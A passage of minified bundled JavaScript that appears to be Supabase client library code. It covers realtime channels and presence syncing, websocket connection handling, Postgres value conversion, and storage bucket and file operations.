0}_matchReceive({status:t,response:r}){this.recHooks.filter(s=>s.status===t).forEach(s=>s.callback(r))}_hasReceived(t){return this.receivedResp&&this.receivedResp.status===t}}var sg;(function(i){i.SYNC="sync",i.JOIN="join",i.LEAVE="leave"})(sg||(sg={}));class rs{constructor(t,r){this.channel=t,this.state={},this.pendingDiffs=[],this.joinRef=null,this.caller={onJoin:()=>{},onLeave:()=>{},onSync:()=>{}};const s=r?.events||{state:"presence_state",diff:"presence_diff"};this.channel._on(s.state,{},a=>{const{onJoin:c,onLeave:d,onSync:h}=this.caller;this.joinRef=this.channel._joinRef(),this.state=rs.syncState(this.state,a,c,d),this.pendingDiffs.forEach(p=>{this.state=rs.syncDiff(this.state,p,c,d)}),this.pendingDiffs=[],h()}),this.channel._on(s.diff,{},a=>{const{onJoin:c,onLeave:d,onSync:h}=this.caller;this.inPendingSyncState()?this.pendingDiffs.push(a):(this.state=rs.syncDiff(this.state,a,c,d),h())}),this.onJoin((a,c,d)=>{this.channel._trigger("presence",{event:"join",key:a,currentPresences:c,newPresences:d})}),this.onLeave((a,c,d)=>{this.channel._trigger("presence",{event:"leave",key:a,currentPresences:c,leftPresences:d})}),this.onSync(()=>{this.channel._trigger("presence",{event:"sync"})})}static syncState(t,r,s,a){const c=this.cloneDeep(t),d=this.transformState(r),h={},p={};return this.map(c,(f,m)=>{d[f]||(p[f]=m)}),this.map(d,(f,m)=>{const y=c[f];if(y){const v=m.map(C=>C.presence_ref),w=y.map(C=>C.presence_ref),P=m.filter(C=>w.indexOf(C.presence_ref)<0),T=y.filter(C=>v.indexOf(C.presence_ref)<0);P.length>0&&(h[f]=P),T.length>0&&(p[f]=T)}else h[f]=m}),this.syncDiff(c,{joins:h,leaves:p},s,a)}static syncDiff(t,r,s,a){const{joins:c,leaves:d}={joins:this.transformState(r.joins),leaves:this.transformState(r.leaves)};return s||(s=()=>{}),a||(a=()=>{}),this.map(c,(h,p)=>{var f;const m=(f=t[h])!==null&&f!==void 0?f:[];if(t[h]=this.cloneDeep(p),m.length>0){const y=t[h].map(w=>w.presence_ref),v=m.filter(w=>y.indexOf(w.presence_ref)<0);t[h].unshift(...v)}s(h,m,p)}),this.map(d,(h,p)=>{let f=t[h];if(!f)return;const m=p.map(y=>y.presence_ref);f=f.filter(y=>m.indexOf(y.presence_ref)<0),t[h]=f,a(h,f,p),f.length===0&&delete t[h]}),t}static map(t,r){return Object.getOwnPropertyNames(t).map(s=>r(s,t[s]))}static transformState(t){return t=this.cloneDeep(t),Object.getOwnPropertyNames(t).reduce((r,s)=>{const a=t[s];return"metas"in a?r[s]=a.metas.map(c=>(c.presence_ref=c.phx_ref,delete c.phx_ref,delete c.phx_ref_prev,c)):r[s]=a,r},{})}static cloneDeep(t){return JSON.parse(JSON.stringify(t))}onJoin(t){this.caller.onJoin=t}onLeave(t){this.caller.onLeave=t}onSync(t){this.caller.onSync=t}inPendingSyncState(){return!this.joinRef||this.joinRef!==this.channel._joinRef()}}var Ie;(function(i){i.abstime="abstime",i.bool="bool",i.date="date",i.daterange="daterange",i.float4="float4",i.float8="float8",i.int2="int2",i.int4="int4",i.int4range="int4range",i.int8="int8",i.int8range="int8range",i.json="json",i.jsonb="jsonb",i.money="money",i.numeric="numeric",i.oid="oid",i.reltime="reltime",i.text="text",i.time="time",i.timestamp="timestamp",i.timestamptz="timestamptz",i.timetz="timetz",i.tsrange="tsrange",i.tstzrange="tstzrange"})(Ie||(Ie={}));const og=(i,t,r={})=>{var s;const a=(s=r.skipTypes)!==null&&s!==void 0?s:[];return Object.keys(t).reduce((c,d)=>(c[d]=$T(d,i,t,a),c),{})},$T=(i,t,r,s)=>{const a=t.find(h=>h.name===i),c=a?.type,d=r[i];return c&&!s.includes(c)?Wy(c,d):ed(d)},Wy=(i,t)=>{if(i.charAt(0)==="_"){const r=i.slice(1,i.length);return KT(t,r)}switch(i){case Ie.bool:return HT(t);case Ie.float4:case Ie.float8:case Ie.int2:case Ie.int4:case Ie.int8:case Ie.numeric:case Ie.oid:return GT(t);case Ie.json:case Ie.jsonb:return qT(t);case Ie.timestamp:return JT(t);case Ie.abstime:case Ie.date:case Ie.daterange:case Ie.int4range:case Ie.int8range:case Ie.money:case Ie.reltime:case Ie.text:case Ie.time:case Ie.timestamptz:case Ie.timetz:case Ie.tsrange:case Ie.tstzrange:return ed(t);default:return ed(t)}},ed=i=>i,HT=i=>{switch(i){case"t":return!0;case"f":return!1;default:return i}},GT=i=>{if(typeof i=="string"){const t=parseFloat(i);if(!Number.isNaN(t))return t}return i},qT=i=>{if(typeof i=="string")try{return JSON.parse(i)}catch(t){return console.log(`JSON parse error: ${t}`),i}return i},KT=(i,t)=>{if(typeof i!="string")return i;const r=i.length-1,s=i[r];if(i[0]==="{"&&s==="}"){let c;const d=i.slice(1,r);try{c=JSON.parse("["+d+"]")}catch{c=d?d.split(","):[]}return c.map(h=>Wy(t,h))}return i},JT=i=>typeof i=="string"?i.replace(" ","T"):i;var ag;(function(i){i.ALL="*",i.INSERT="INSERT",i.UPDATE="UPDATE",i.DELETE="DELETE"})(ag||(ag={}));var lg;(function(i){i.BROADCAST="broadcast",i.PRESENCE="presence",i.POSTGRES_CHANGES="postgres_changes"})(lg||(lg={}));var cg;(function(i){i.SUBSCRIBED="SUBSCRIBED",i.TIMED_OUT="TIMED_OUT",i.CLOSED="CLOSED",i.CHANNEL_ERROR="CHANNEL_ERROR"})(cg||(cg={}));class Fd{constructor(t,r={config:{}},s){this.topic=t,this.params=r,this.socket=s,this.bindings={},this.state=xt.closed,this.joinedOnce=!1,this.pushBuffer=[],this.subTopic=t.replace(/^realtime:/i,""),this.params.config=Object.assign({broadcast:{ack:!1,self:!1},presence:{key:""}},r.config),this.timeout=this.socket.timeout,this.joinPush=new Ec(this,$t.join,this.params,this.timeout),this.rejoinTimer=new Uy(()=>this._rejoinUntilConnected(),this.socket.reconnectAfterMs),this.joinPush.receive("ok",()=>{this.state=xt.joined,this.rejoinTimer.reset(),this.pushBuffer.forEach(a=>a.send()),this.pushBuffer=[]}),this._onClose(()=>{this.rejoinTimer.reset(),this.socket.log("channel",`close ${this.topic} ${this._joinRef()}`),this.state=xt.closed,this.socket._remove(this)}),this._onError(a=>{this._isLeaving()||this._isClosed()||(this.socket.log("channel",`error ${this.topic}`,a),this.state=xt.errored,this.rejoinTimer.scheduleTimeout())}),this.joinPush.receive("timeout",()=>{this._isJoining()&&(this.socket.log("channel",`timeout ${this.topic}`,this.joinPush.timeout),this.state=xt.errored,this.rejoinTimer.scheduleTimeout())}),this._on($t.reply,{},(a,c)=>{this._trigger(this._replyEventName(c),a)}),this.presence=new rs(this),this.broadcastEndpointURL=this._broadcastEndpointURL()}subscribe(t,r=this.timeout){var s,a;if(this.socket.isConnected()||this.socket.connect(),this.joinedOnce)throw"tried to subscribe multiple times. 'subscribe' can only be called a single time per channel instance";{const{config:{broadcast:c,presence:d}}=this.params;this._onError(f=>t&&t("CHANNEL_ERROR",f)),this._onClose(()=>t&&t("CLOSED"));const h={},p={broadcast:c,presence:d,postgres_changes:(a=(s=this.bindings.postgres_changes)===null||s===void 0?void 0:s.map(f=>f.filter))!==null&&a!==void 0?a:[]};this.socket.accessToken&&(h.access_token=this.socket.accessToken),this.updateJoinPayload(Object.assign({config:p},h)),this.joinedOnce=!0,this._rejoin(r),this.joinPush.receive("ok",({postgres_changes:f})=>{var m;if(this.socket.accessToken&&this.socket.setAuth(this.socket.accessToken),f===void 0){t&&t("SUBSCRIBED");return}else{const y=this.bindings.postgres_changes,v=(m=y?.length)!==null&&m!==void 0?m:0,w=[];for(let P=0;P<v;P++){const T=y[P],{filter:{event:C,schema:L,table:R,filter:M}}=T,O=f&&f[P];if(O&&O.event===C&&O.schema===L&&O.table===R&&O.filter===M)w.push(Object.assign(Object.assign({},T),{id:O.id}));else{this.unsubscribe(),t&&t("CHANNEL_ERROR",new Error("mismatch between server and client bindings for postgres changes"));return}}this.bindings.postgres_changes=w,t&&t("SUBSCRIBED");return}}).receive("error",f=>{t&&t("CHANNEL_ERROR",new Error(JSON.stringify(Object.values(f).join(", ")||"error")))}).receive("timeout",()=>{t&&t("TIMED_OUT")})}return this}presenceState(){return this.presence.state}async track(t,r={}){return await this.send({type:"presence",event:"track",payload:t},r.timeout||this.timeout)}async untrack(t={}){return await this.send({type:"presence",event:"untrack"},t)}on(t,r,s){return this._on(t,r,s)}async send(t,r={}){var s,a;if(!this._canPush()&&t.type==="broadcast"){const{event:c,payload:d}=t,h={method:"POST",headers:{apikey:(s=this.socket.accessToken)!==null&&s!==void 0?s:"","Content-Type":"application/json"},body:JSON.stringify({messages:[{topic:this.subTopic,event:c,payload:d}]})};try{return(await this._fetchWithTimeout(this.broadcastEndpointURL,h,(a=r.timeout)!==null&&a!==void 0?a:this.timeout)).ok?"ok":"error"}catch(p){return p.name==="AbortError"?"timed out":"error"}}else return new Promise(c=>{var d,h,p;const f=this._push(t.type,t,r.timeout||this.timeout);t.type==="broadcast"&&!(!((p=(h=(d=this.params)===null||d===void 0?void 0:d.config)===null||h===void 0?void 0:h.broadcast)===null||p===void 0)&&p.ack)&&c("ok"),f.receive("ok",()=>c("ok")),f.receive("timeout",()=>c("timed out"))})}updateJoinPayload(t){this.joinPush.updatePayload(t)}unsubscribe(t=this.timeout){this.state=xt.leaving;const r=()=>{this.socket.log("channel",`leave ${this.topic}`),this._trigger($t.close,"leave",this._joinRef())};return this.rejoinTimer.reset(),this.joinPush.destroy(),new Promise(s=>{const a=new Ec(this,$t.leave,{},t);a.receive("ok",()=>{r(),s("ok")}).receive("timeout",()=>{r(),s("timed out")}).receive("error",()=>{s("error")}),a.send(),this._canPush()||a.trigger("ok",{})})}_broadcastEndpointURL(){let t=this.socket.endPoint;return t=t.replace(/^ws/i,"http"),t=t.replace(/(\/socket\/websocket|\/socket|\/websocket)\/?$/i,""),t.replace(/\/+$/,"")+"/api/broadcast"}async _fetchWithTimeout(t,r,s){const a=new AbortController,c=setTimeout(()=>a.abort(),s),d=await this.socket.fetch(t,Object.assign(Object.assign({},r),{signal:a.signal}));return clearTimeout(c),d}_push(t,r,s=this.timeout){if(!this.joinedOnce)throw`tried to push '${t}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;let a=new Ec(this,t,r,s);return this._canPush()?a.send():(a.startTimeout(),this.pushBuffer.push(a)),a}_onMessage(t,r,s){return r}_isMember(t){return this.topic===t}_joinRef(){return this.joinPush.ref}_trigger(t,r,s){var a,c;const d=t.toLocaleLowerCase(),{close:h,error:p,leave:f,join:m}=$t;if(s&&[h,p,f,m].indexOf(d)>=0&&s!==this._joinRef())return;let v=this._onMessage(d,r,s);if(r&&!v)throw"channel onMessage callbacks must return the payload, modified or unmodified";["insert","update","delete"].includes(d)?(a=this.bindings.postgres_changes)===null||a===void 0||a.filter(w=>{var P,T,C;return((P=w.filter)===null||P===void 0?void 0:P.event)==="*"||((C=(T=w.filter)===null||T===void 0?void 0:T.event)===null||C===void 0?void 0:C.toLocaleLowerCase())===d}).map(w=>w.callback(v,s)):(c=this.bindings[d])===null||c===void 0||c.filter(w=>{var P,T,C,L,R,M;if(["broadcast","presence","postgres_changes"].includes(d))if("id"in w){const O=w.id,W=(P=w.filter)===null||P===void 0?void 0:P.event;return O&&((T=r.ids)===null||T===void 0?void 0:T.includes(O))&&(W==="*"||W?.toLocaleLowerCase()===((C=r.data)===null||C===void 0?void 0:C.type.toLocaleLowerCase()))}else{const O=(R=(L=w?.filter)===null||L===void 0?void 0:L.event)===null||R===void 0?void 0:R.toLocaleLowerCase();return O==="*"||O===((M=r?.event)===null||M===void 0?void 0:M.toLocaleLowerCase())}else return w.type.toLocaleLowerCase()===d}).map(w=>{if(typeof v=="object"&&"ids"in v){const P=v.data,{schema:T,table:C,commit_timestamp:L,type:R,errors:M}=P;v=Object.assign(Object.assign({},{schema:T,table:C,commit_timestamp:L,eventType:R,new:{},old:{},errors:M}),this._getPayloadRecords(P))}w.callback(v,s)})}_isClosed(){return this.state===xt.closed}_isJoined(){return this.state===xt.joined}_isJoining(){return this.state===xt.joining}_isLeaving(){return this.state===xt.leaving}_replyEventName(t){return`chan_reply_${t}`}_on(t,r,s){const a=t.toLocaleLowerCase(),c={type:a,filter:r,callback:s};return this.bindings[a]?this.bindings[a].push(c):this.bindings[a]=[c],this}_off(t,r){const s=t.toLocaleLowerCase();return this.bindings[s]=this.bindings[s].filter(a=>{var c;return!(((c=a.type)===null||c===void 0?void 0:c.toLocaleLowerCase())===s&&Fd.isEqual(a.filter,r))}),this}static isEqual(t,r){if(Object.keys(t).length!==Object.keys(r).length)return!1;for(const s in t)if(t[s]!==r[s])return!1;return!0}_rejoinUntilConnected(){this.rejoinTimer.scheduleTimeout(),this.socket.isConnected()&&this._rejoin()}_onClose(t){this._on($t.close,{},t)}_onError(t){this._on($t.error,{},r=>t(r))}_canPush(){return this.socket.isConnected()&&this._isJoined()}_rejoin(t=this.timeout){this._isLeaving()||(this.socket._leaveOpenTopic(this.topic),this.state=xt.joining,this.joinPush.resend(t))}_getPayloadRecords(t){const r={new:{},old:{}};return(t.type==="INSERT"||t.type==="UPDATE")&&(r.new=og(t.columns,t.record)),(t.type==="UPDATE"||t.type==="DELETE")&&(r.old=og(t.columns,t.old_record)),r}}const QT=()=>{},YT=typeof WebSocket<"u";class XT{constructor(t,r){var s;this.accessToken=null,this.channels=[],this.endPoint="",this.headers=zT,this.params={},this.timeout=Vy,this.heartbeatIntervalMs=3e4,this.heartbeatTimer=void 0,this.pendingHeartbeatRef=null,this.ref=0,this.logger=QT,this.conn=null,this.sendBuffer=[],this.serializer=new WT,this.stateChangeCallbacks={open:[],close:[],error:[],message:[]},this._resolveFetch=c=>{let d;return c?d=c:typeof fetch>"u"?d=(...h)=>ir(async()=>{const{default:p}=await Promise.resolve().then(()=>ms);return{default:p}},void 0).then(({default:p})=>p(...h)):d=fetch,(...h)=>d(...h)},this.endPoint=`${t}/${Zc.websocket}`,r?.transport?this.transport=r.transport:this.transport=null,r?.params&&(this.params=r.params),r?.headers&&(this.headers=Object.assign(Object.assign({},this.headers),r.headers)),r?.timeout&&(this.timeout=r.timeout),r?.logger&&(this.logger=r.logger),r?.heartbeatIntervalMs&&(this.heartbeatIntervalMs=r.heartbeatIntervalMs);const a=(s=r?.params)===null||s===void 0?void 0:s.apikey;a&&(this.accessToken=a),this.reconnectAfterMs=r?.reconnectAfterMs?r.reconnectAfterMs:c=>[1e3,2e3,5e3,1e4][c-1]||1e4,this.encode=r?.encode?r.encode:(c,d)=>d(JSON.stringify(c)),this.decode=r?.decode?r.decode:this.serializer.decode.bind(this.serializer),this.reconnectTimer=new Uy(async()=>{this.disconnect(),this.connect()},this.reconnectAfterMs),this.fetch=this._resolveFetch(r?.fetch)}connect(){if(!this.conn){if(this.transport){this.conn=new this.transport(this._endPointURL(),void 0,{headers:this.headers});return}if(YT){this.conn=new WebSocket(this._endPointURL()),this.setupConnection();return}this.conn=new ZT(this._endPointURL(),void 0,{close:()=>{this.conn=null}}),ir(async()=>{const{default:t}=await import("./browser-CMGlMPrC.js").then(r=>r.b);return{default:t}},[]).then(({default:t})=>{this.conn=new t(this._endPointURL(),void 0,{headers:this.headers}),this.setupConnection()})}}disconnect(t,r){this.conn&&(this.conn.onclose=function(){},t?this.conn.close(t,r??""):this.conn.close(),this.conn=null,this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.reset())}getChannels(){return this.channels}async removeChannel(t){const r=await t.unsubscribe();return this.channels.length===0&&this.disconnect(),r}async removeAllChannels(){const t=await Promise.all(this.channels.map(r=>r.unsubscribe()));return this.disconnect(),t}log(t,r,s){this.logger(t,r,s)}connectionState(){switch(this.conn&&this.conn.readyState){case er.connecting:return li.Connecting;case er.open:return li.Open;case er.closing:return li.Closing;default:return li.Closed}}isConnected(){return this.connectionState()===li.Open}channel(t,r={config:{}}){const s=new Fd(`realtime:${t}`,r,this);return this.channels.push(s),s}push(t){const{topic:r,event:s,payload:a,ref:c}=t,d=()=>{this.encode(t,h=>{var p;(p=this.conn)===null||p===void 0||p.send(h)})};this.log("push",`${r} ${s} (${c})`,a),this.isConnected()?d():this.sendBuffer.push(d)}setAuth(t){this.accessToken=t,this.channels.forEach(r=>{t&&r.updateJoinPayload({access_token:t}),r.joinedOnce&&r._isJoined()&&r._push($t.access_token,{access_token:t})})}_makeRef(){let t=this.ref+1;return t===this.ref?this.ref=0:this.ref=t,this.ref.toString()}_leaveOpenTopic(t){let r=this.channels.find(s=>s.topic===t&&(s._isJoined()||s._isJoining()));r&&(this.log("transport",`leaving duplicate topic "${t}"`),r.unsubscribe())}_remove(t){this.channels=this.channels.filter(r=>r._joinRef()!==t._joinRef())}setupConnection(){this.conn&&(this.conn.binaryType="arraybuffer",this.conn.onopen=()=>this._onConnOpen(),this.conn.onerror=t=>this._onConnError(t),this.conn.onmessage=t=>this._onConnMessage(t),this.conn.onclose=t=>this._onConnClose(t))}_endPointURL(){return this._appendParams(this.endPoint,Object.assign({},this.params,{vsn:VT}))}_onConnMessage(t){this.decode(t.data,r=>{let{topic:s,event:a,payload:c,ref:d}=r;(d&&d===this.pendingHeartbeatRef||a===c?.type)&&(this.pendingHeartbeatRef=null),this.log("receive",`${c.status||""} ${s} ${a} ${d&&"("+d+")"||""}`,c),this.channels.filter(h=>h._isMember(s)).forEach(h=>h._trigger(a,c,d)),this.stateChangeCallbacks.message.forEach(h=>h(r))})}_onConnOpen(){this.log("transport",`connected to ${this._endPointURL()}`),this._flushSendBuffer(),this.reconnectTimer.reset(),this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.heartbeatTimer=setInterval(()=>this._sendHeartbeat(),this.heartbeatIntervalMs),this.stateChangeCallbacks.open.forEach(t=>t())}_onConnClose(t){this.log("transport","close",t),this._triggerChanError(),this.heartbeatTimer&&clearInterval(this.heartbeatTimer),this.reconnectTimer.scheduleTimeout(),this.stateChangeCallbacks.close.forEach(r=>r(t))}_onConnError(t){this.log("transport",t.message),this._triggerChanError(),this.stateChangeCallbacks.error.forEach(r=>r(t))}_triggerChanError(){this.channels.forEach(t=>t._trigger($t.error))}_appendParams(t,r){if(Object.keys(r).length===0)return t;const s=t.match(/\?/)?"&":"?",a=new URLSearchParams(r);return`${t}${s}${a}`}_flushSendBuffer(){this.isConnected()&&this.sendBuffer.length>0&&(this.sendBuffer.forEach(t=>t()),this.sendBuffer=[])}_sendHeartbeat(){var t;if(this.isConnected()){if(this.pendingHeartbeatRef){this.pendingHeartbeatRef=null,this.log("transport","heartbeat timeout. Attempting to re-establish connection"),(t=this.conn)===null||t===void 0||t.close(UT,"hearbeat timeout");return}this.pendingHeartbeatRef=this._makeRef(),this.push({topic:"phoenix",event:"heartbeat",payload:{},ref:this.pendingHeartbeatRef}),this.setAuth(this.accessToken)}}}class ZT{constructor(t,r,s){this.binaryType="arraybuffer",this.onclose=()=>{},this.onerror=()=>{},this.onmessage=()=>{},this.onopen=()=>{},this.readyState=er.connecting,this.send=()=>{},this.url=null,this.url=t,this.close=s.close}}class zd extends Error{constructor(t){super(t),this.__isStorageError=!0,this.name="StorageError"}}function ot(i){return typeof i=="object"&&i!==null&&"__isStorageError"in i}class eS extends zd{constructor(t,r){super(t),this.name="StorageApiError",this.status=r}toJSON(){return{name:this.name,message:this.message,status:this.status}}}class dg extends zd{constructor(t,r){super(t),this.name="StorageUnknownError",this.originalError=r}}var tS=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};const $y=i=>{let t;return i?t=i:typeof fetch>"u"?t=(...r)=>ir(async()=>{const{default:s}=await Promise.resolve().then(()=>ms);return{default:s}},void 0).then(({default:s})=>s(...r)):t=fetch,(...r)=>t(...r)},nS=()=>tS(void 0,void 0,void 0,function*(){return typeof Response>"u"?(yield ir(()=>Promise.resolve().then(()=>ms),void 0)).Response:Response});var sr=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};const Pc=i=>i.msg||i.message||i.error_description||i.error||JSON.stringify(i),iS=(i,t)=>sr(void 0,void 0,void 0,function*(){const r=yield nS();i instanceof r?i.json().then(s=>{t(new eS(Pc(s),i.status||500))}).catch(s=>{t(new dg(Pc(s),s))}):t(new dg(Pc(i),i))}),rS=(i,t,r,s)=>{const a={method:i,headers:t?.headers||{}};return i==="GET"?a:(a.headers=Object.assign({"Content-Type":"application/json"},t?.headers),a.body=JSON.stringify(s),Object.assign(Object.assign({},a),r))};function ca(i,t,r,s,a,c){return sr(this,void 0,void 0,function*(){return new Promise((d,h)=>{i(r,rS(t,s,a,c)).then(p=>{if(!p.ok)throw p;return s?.noResolveJson?p:p.json()}).then(p=>d(p)).catch(p=>iS(p,h))})})}function td(i,t,r,s){return sr(this,void 0,void 0,function*(){return ca(i,"GET",t,r,s)})}function On(i,t,r,s,a){return sr(this,void 0,void 0,function*(){return ca(i,"POST",t,s,a,r)})}function sS(i,t,r,s,a){return sr(this,void 0,void 0,function*(){return ca(i,"PUT",t,s,a,r)})}function Hy(i,t,r,s,a){return sr(this,void 0,void 0,function*(){return ca(i,"DELETE",t,s,a,r)})}var Mt=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};const oS={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},ug={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};class aS{constructor(t,r={},s,a){this.url=t,this.headers=r,this.bucketId=s,this.fetch=$y(a)}uploadOrUpdate(t,r,s,a){return Mt(this,void 0,void 0,function*(){try{let c;const d=Object.assign(Object.assign({},ug),a),h=Object.assign(Object.assign({},this.headers),t==="POST"&&{"x-upsert":String(d.upsert)});typeof Blob<"u"&&s instanceof Blob?(c=new FormData,c.append("cacheControl",d.cacheControl),c.append("",s)):typeof FormData<"u"&&s instanceof FormData?(c=s,c.append("cacheControl",d.cacheControl)):(c=s,h["cache-control"]=`max-age=${d.cacheControl}`,h["content-type"]=d.contentType);const p=this._removeEmptyFolders(r),f=this._getFinalPath(p),m=yield this.fetch(`${this.url}/object/${f}`,Object.assign({method:t,body:c,headers:h},d?.duplex?{duplex:d.duplex}:{})),y=yield m.json();return m.ok?{data:{path:p,id:y.Id,fullPath:y.Key},error:null}:{data:null,error:y}}catch(c){if(ot(c))return{data:null,error:c};throw c}})}upload(t,r,s){return Mt(this,void 0,void 0,function*(){return this.uploadOrUpdate("POST",t,r,s)})}uploadToSignedUrl(t,r,s,a){return Mt(this,void 0,void 0,function*(){const c=this._removeEmptyFolders(t),d=this._getFinalPath(c),h=new URL(this.url+`/object/upload/sign/${d}`);h.searchParams.set("token",r);try{let p;const f=Object.assign({upsert:ug.upsert},a),m=Object.assign(Object.assign({},this.headers),{"x-upsert":String(f.upsert)});typeof Blob<"u"&&s instanceof Blob?(p=new FormData,p.append("cacheControl",f.cacheControl),p.append("",s)):typeof FormData<"u"&&s instanceof FormData?(p=s,p.append("cacheControl",f.cacheControl)):(p=s,m["cache-control"]=`max-age=${f.cacheControl}`,m["content-type"]=f.contentType);const y=yield this.fetch(h.toString(),{method:"PUT",body:p,headers:m}),v=yield y.json();return y.ok?{data:{path:c,fullPath:v.Key},error:null}:{data:null,error:v}}catch(p){if(ot(p))return{data:null,error:p};throw p}})}createSignedUploadUrl(t){return Mt(this,void 0,void 0,function*(){try{let r=this._getFinalPath(t);const s=yield On(this.fetch,`${this.url}/object/upload/sign/${r}`,{},{headers:this.headers}),a=new URL(this.url+s.url),c=a.searchParams.get("token");if(!c)throw new zd("No token returned by API");return{data:{signedUrl:a.toString(),path:t,token:c},error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}update(t,r,s){return Mt(this,void 0,void 0,function*(){return this.uploadOrUpdate("PUT",t,r,s)})}move(t,r){return Mt(this,void 0,void 0,function*(){try{return{data:yield On(this.fetch,`${this.url}/object/move`,{bucketId:this.bucketId,sourceKey:t,destinationKey:r},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}copy(t,r){return Mt(this,void 0,void 0,function*(){try{return{data:{path:(yield On(this.fetch,`${this.url}/object/copy`,{bucketId:this.bucketId,sourceKey:t,destinationKey:r},{headers:this.headers})).Key},error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}createSignedUrl(t,r,s){return Mt(this,void 0,void 0,function*(){try{let a=this._getFinalPath(t),c=yield On(this.fetch,`${this.url}/object/sign/${a}`,Object.assign({expiresIn:r},s?.transform?{transform:s.transform}:{}),{headers:this.headers});const d=s?.download?`&download=${s.download===!0?"":s.download}`:"";return c={signedUrl:encodeURI(`${this.url}${c.signedURL}${d}`)},{data:c,error:null}}catch(a){if(ot(a))return{data:null,error:a};throw a}})}createSignedUrls(t,r,s){return Mt(this,void 0,void 0,function*(){try{const a=yield On(this.fetch,`${this.url}/object/sign/${this.bucketId}`,{expiresIn:r,paths:t},{headers:this.headers}),c=s?.download?`&download=${s.download===!0?"":s.download}`:"";return{data:a.map(d=>Object.assign(Object.assign({},d),{signedUrl:d.signedURL?encodeURI(`${this.url}${d.signedURL}${c}`):null})),error:null}}catch(a){if(ot(a))return{data:null,error:a};throw a}})}download(t,r){return Mt(this,void 0,void 0,function*(){const a=typeof r?.transform<"u"?"render/image/authenticated":"object",c=this.transformOptsToQueryString(r?.transform||{}),d=c?`?${c}`:"";try{const h=this._getFinalPath(t);return{data:yield(yield td(this.fetch,`${this.url}/${a}/${h}${d}`,{headers:this.headers,noResolveJson:!0})).blob(),error:null}}catch(h){if(ot(h))return{data:null,error:h};throw h}})}getPublicUrl(t,r){const s=this._getFinalPath(t),a=[],c=r?.download?`download=${r.download===!0?"":r.download}`:"";c!==""&&a.push(c);const h=typeof r?.transform<"u"?"render/image":"object",p=this.transformOptsToQueryString(r?.transform||{});p!==""&&a.push(p);let f=a.join("&");return f!==""&&(f=`?${f}`),{data:{publicUrl:encodeURI(`${this.url}/${h}/public/${s}${f}`)}}}remove(t){return Mt(this,void 0,void 0,function*(){try{return{data:yield Hy(this.fetch,`${this.url}/object/${this.bucketId}`,{prefixes:t},{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}list(t,r,s){return Mt(this,void 0,void 0,function*(){try{const a=Object.assign(Object.assign(Object.assign({},oS),r),{prefix:t||""});return{data:yield On(this.fetch,`${this.url}/object/list/${this.bucketId}`,a,{headers:this.headers},s),error:null}}catch(a){if(ot(a))return{data:null,error:a};throw a}})}_getFinalPath(t){return`${this.bucketId}/${t}`}_removeEmptyFolders(t){return t.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(t){const r=[];return t.width&&r.push(`width=${t.width}`),t.height&&r.push(`height=${t.height}`),t.resize&&r.push(`resize=${t.resize}`),t.format&&r.push(`format=${t.format}`),t.quality&&r.push(`quality=${t.quality}`),r.join("&")}}const lS="2.5.5",cS={"X-Client-Info":`storage-js/${lS}`};var Wi=function(i,t,r,s){function a(c){return c instanceof r?c:new r(function(d){d(c)})}return new(r||(r=Promise))(function(c,d){function h(m){try{f(s.next(m))}catch(y){d(y)}}function p(m){try{f(s.throw(m))}catch(y){d(y)}}function f(m){m.done?c(m.value):a(m.value).then(h,p)}f((s=s.apply(i,t||[])).next())})};class dS{constructor(t,r={},s){this.url=t,this.headers=Object.assign(Object.assign({},cS),r),this.fetch=$y(s)}listBuckets(){return Wi(this,void 0,void 0,function*(){try{return{data:yield td(this.fetch,`${this.url}/bucket`,{headers:this.headers}),error:null}}catch(t){if(ot(t))return{data:null,error:t};throw t}})}getBucket(t){return Wi(this,void 0,void 0,function*(){try{return{data:yield td(this.fetch,`${this.url}/bucket/${t}`,{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}createBucket(t,r={public:!1}){return Wi(this,void 0,void 0,function*(){try{return{data:yield On(this.fetch,`${this.url}/bucket`,{id:t,name:t,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}updateBucket(t,r){return Wi(this,void 0,void 0,function*(){try{return{data:yield sS(this.fetch,`${this.url}/bucket/${t}`,{id:t,name:t,public:r.public,file_size_limit:r.fileSizeLimit,allowed_mime_types:r.allowedMimeTypes},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}emptyBucket(t){return Wi(this,void 0,void 0,function*(){try{return{data:yield On(this.fetch,`${this.url}/bucket/${t}/empty`,{},{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}deleteBucket(t){return Wi(this,void 0,void 0,function*(){try{return{data:yield Hy(this.fetch,`${this.url}/bucket/${t}`,{},{headers:this.headers}),error:null}}catch(r){if(ot(r))return{data:null,error:r};throw r}})}}class uS extends dS{constructor(t,r={},s){super(t,r,s)}from(t){return new aS(this.url,this.headers,t,this.fetch)}}const hS="2.39.1";let Xr="";typeof Deno<"u"?Xr="deno":typeof 